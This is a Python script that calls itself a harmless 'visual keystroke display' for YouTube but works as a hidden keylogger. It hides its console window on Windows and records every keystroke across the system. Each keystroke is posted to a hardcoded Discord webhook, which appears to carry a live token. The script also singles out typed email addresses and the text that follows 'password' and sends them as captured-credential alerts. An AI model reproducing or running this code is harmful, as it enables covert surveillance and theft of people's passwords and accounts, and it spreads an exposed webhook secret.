# GRAE-X LABS - VISUAL KEYSTROKE DISPLAY
# Shows keystrokes as they're typed - Perfect for YouTube!

import sys
import os
import time
from datetime import datetime

# Hide window on Windows
if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# YOUR DISCORD WEBHOOK
WEBHOOK_URL = "https://discord.com/api/webhooks/1442403527153553509/5-OH8R4qWMZeBJ0YWH5ijjHGCg0wUJfh9hW-E0VfF9VuZyNsQXuc_uw1GdJOQF8lynOz"

def send_discord(message):
    """Send formatted message to Discord"""
    try:
        import requests
        payload = {"content": message, "username": "⌨️ Live Keystrokes"}
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
        return True
    except:
        return False

def create_typing_visual(buffer, new_char=None):
    """Create visual representation of typing"""
    if not buffer:
        return "`[Empty]`"
    
    # Show last 40 characters for visual context
    display_text = buffer[-40:]
    
    # Create visual representation
    if new_char:
        visual = f"```\n{display_text}\n{' ' * (len(display_text)-1)}^```"
    else:
        visual = f"```\n{display_text}```"
    
    return visual

def main():
    send_discord("🎬 **LIVE KEYSTROKE CAPTURE STARTED**")
    send_discord("💡 *Start typing in any application to see live capture below...*")
    
    try:
        from pynput import keyboard
    except ImportError:
        send_discord("❌ Keyboard monitoring unavailable")
        return
    
    buffer = ""
    last_visual_time = time.time()
    visual_buffer = ""
    
    def on_press(key):
        nonlocal buffer, last_visual_time, visual_buffer
        
        try:
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            # Handle key press
            if hasattr(key, 'char') and key.char:
                char = key.char
                buffer += char
                visual_buffer += char
                
                # Send visual update for each character
                visual = create_typing_visual(visual_buffer, char)
                send_discord(f"**{timestamp}** - Character: `{char}`\n{visual}")
                
            else:
                key_name = str(key)
                if 'Key.space' in key_name:
                    buffer += " "
                    visual_buffer += " ▁ "  # Visual space
                    send_discord(f"**{timestamp}** - `[SPACE]`\n{create_typing_visual(visual_buffer)}")
                    
                elif 'Key.enter' in key_name:
                    buffer += "\n"
                    visual_buffer += " ↵ "  # Visual enter
                    send_discord(f"**{timestamp}** - `[ENTER]`\n{create_typing_visual(visual_buffer)}")
                    # Reset visual buffer on enter for cleaner display
                    visual_buffer = ""
                    
                elif 'Key.backspace' in key_name:
                    buffer = buffer[:-1] if buffer else ""
                    visual_buffer = visual_buffer[:-1] if visual_buffer else ""
                    send_discord(f"**{timestamp}** - `[BACKSPACE]`\n{create_typing_visual(visual_buffer)}")
                    
                elif 'Key.tab' in key_name:
                    visual_buffer += " → "  # Visual tab
                    send_discord(f"**{timestamp}** - `[TAB]`\n{create_typing_visual(visual_buffer)}")
                    
                else:
                    # Other special keys
                    clean_name = key_name.replace('Key.', '')
                    send_discord(f"**{timestamp}** - `[{clean_name.upper()}]`")
            
            # Check for credentials with visual alerts
            if '@' in buffer and '.' in buffer:
                for word in buffer.split():
                    if '@' in word and '.' in word:
                        send_discord(f"🚨 **EMAIL CAPTURED!** ```{word}```")
                        buffer = buffer.replace(word, "")
            
            if 'password' in buffer.lower():
                idx = buffer.lower().find('password')
                if len(buffer) > idx + 8:
                    text = buffer[idx+8:idx+30]
                    send_discord(f"🔑 **PASSWORD TYPED!** ```{text}```")
            
            # Clean buffers
            if len(buffer) > 500:
                buffer = buffer[-250:]
            if len(visual_buffer) > 60:
                visual_buffer = visual_buffer[-40:]
                
        except Exception as e:
            pass
        
        return True
    
    def on_release(key):
        return True
    
    # Start listening
    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        send_discord(f"❌ Monitoring error: {str(e)}")

if __name__ == "__main__":
    main()